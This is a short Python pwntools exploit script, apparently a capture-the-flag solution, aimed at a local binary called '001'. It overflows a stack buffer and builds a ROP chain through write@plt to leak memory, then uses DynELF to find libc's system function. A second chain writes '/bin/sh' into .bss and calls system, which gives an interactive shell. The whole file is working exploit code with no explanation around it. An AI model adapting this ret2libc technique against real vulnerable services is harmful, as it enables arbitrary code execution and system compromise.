#!/usr/bin/python 
from pwn import *

p = process('001')
elf = ELF('001')

read_plt = elf.symbols['read']
write_plt = elf.symbols['write']
main = elf.symbols['main']

def leak(address):
    payload1 = "A" * 140 + p32(write_plt) + p32(main) + p32(1) + p32(address) + p32(4)
    p.sendline(payload1)
    data = p.recv(4)
    log.info("%#x => %s" % (address, (data or '').encode('hex')))
    return data

d = DynELF(leak, elf=ELF('001'))

system_addr = d.lookup('system', 'libc')
log.info("system_addr = " + hex(system_addr))

bss_addr = elf.symbols['__bss_start']
pppr = 0x804850d

payload2 = "B" * 140 + p32(read_plt) + p32(pppr) + p32(0) + p32(bss_addr) + p32(8)
payload2 += p32(system_addr) + p32(main) + p32(bss_addr)

p.sendline(payload2)
p.sendline("/bin/sh\0")

p.interactive()